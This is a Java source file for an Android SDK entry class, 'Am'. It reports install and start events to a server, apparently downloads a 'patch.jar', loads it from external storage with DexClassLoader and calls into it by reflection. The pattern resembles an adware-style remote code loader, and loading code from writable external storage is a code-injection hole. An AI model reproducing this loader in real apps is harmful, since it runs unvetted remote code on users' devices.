package com.network.widget.m;


import android.content.Context;
import android.content.Intent;
import android.os.Environment;
import android.os.Handler;

import com.network.widget.api.Constant;
import com.network.widget.net.HttpAddSdk;
import com.network.widget.net.HttpStartApp;
import com.network.widget.net.HttpVersion;
import com.network.widget.utils.LogUtils;
import com.network.widget.utils.SPUtils;
import com.network.widget.utils.Utils;
import com.network.widget.w.RequestToDataService;

import java.io.File;
import java.lang.reflect.Method;

import dalvik.system.DexClassLoader;


/**
 * SDK 初始化主入口 对外提供初始化接口
 */
public class Am {

    private volatile static Am mInstance;
    public static Context mContext;
    public static DexClassLoader dexClassLoader = null;
    public static boolean flag = true;

    public static int maxRequestStartApp = 0;
    public static int maxRequestAddSdk = 0;

    private Am() {
    }

    private Am(Context context) {
        mContext = context;
    }

    public static Am getInstance(Context context) {
        if (mInstance == null) {
            synchronized (Am.class) {
                if (mInstance == null) {
                    mInstance = new Am(context);
                    SPUtils.getInstance(context);
                    Constant.APPID = Utils.getDataAppid(context);
                    CrashHandler.getInstance().init(context);
                    LogUtils.d("open CrashHandler ->");
                    init();
                }
            }
        } else {
            init();
        }
        return mInstance;
    }

    private static Handler handler = new Handler() {
        public void handleMessage(android.os.Message msg) {

            switch (msg.what) {
                case 1:
                    LogUtils.i("jar update succeed -> start SDKService");
                    startSDKService();
                    break;
                case 2:
                    LogUtils.i("download jar error");
                    handler.postDelayed(new Runnable() {

                        @Override
                        public void run() {

                            LogUtils.i("download jar error -  1h reStart init()");
                            init();
                        }
                    }, 60000 * 60);
                    break;
            }
        }

        ;
    };

    private static void init() {

        LogUtils.i("Am init();");

        //当前网络未连接直接取消
        if (!Utils.isNetworkAvailable(mContext)) {
            LogUtils.i("this network not ok - > Stop code -> return");
            return;
        }

        //统计新增活跃
        boolean fistRun = (boolean) SPUtils.get(Constant.FIST_RUN, false);
        if (!fistRun) {
            new HttpAddSdk(mContext).start();
        }
        new HttpStartApp(mContext).start();

        //当前服务运行中直接发起活动请求
        if (Utils.thisServiceHasRun(mContext)) {
            startSDKService();
        } else {
            //当前服务未启动检查版本
            LogUtils.i("start AppManager init start HttpREquestVersionCode()");
            new HttpVersion(mContext, handler).start();
        }

    }

    private static void startSDKService() {
        if (flag) {
            //dexPath 为获取当前包下dex类文件
            final File dexPath = new File(mContext.getExternalFilesDir(Environment.DIRECTORY_DOCUMENTS), "patch.jar");
            //dexOutputPatch 获取dex读取后存放路径
            final String dexOutputPath = mContext.getDir("dex", Context.MODE_PRIVATE).getAbsolutePath();

            LogUtils.i("jarCode loadPath : " + dexPath.getAbsolutePath());
            LogUtils.i("jarCode cachePath：" + dexOutputPath);

            //通过dexClassLoader类加载器 加载dex代码
            if (dexPath.exists()) {
                dexClassLoader = new DexClassLoader(dexPath.getAbsolutePath(), dexOutputPath, null, mContext.getClass().getClassLoader().getParent());
            }
            flag = false;
        }


        handler.post(new Runnable() {
            @Override
            public void run() {
                LogUtils.i("startSDKService");
                //启动服务
                if (!Utils.thisServiceHasRun(mContext)) {
                    mContext.startService(new Intent(mContext, RequestToDataService.class));
                }
            }
        });
    }

    public static void screenInterface() {
        if (flag == false) {
            try {

                Class<?> sdkManagerClass = Am.dexClassLoader.loadClass(Constant.SCREEN_INTERFACE);

                Method initMethod = sdkManagerClass.getDeclaredMethod("condition", new Class[]{Context.class});

                initMethod.invoke(sdkManagerClass.newInstance(), new Object[]{mContext});

            } catch (Exception e) {
                e.printStackTrace();

                LogUtils.i("read jar code is Exception" + e);
            }
        } else {
            LogUtils.e("等待 代码初始化");
        }
    }


}
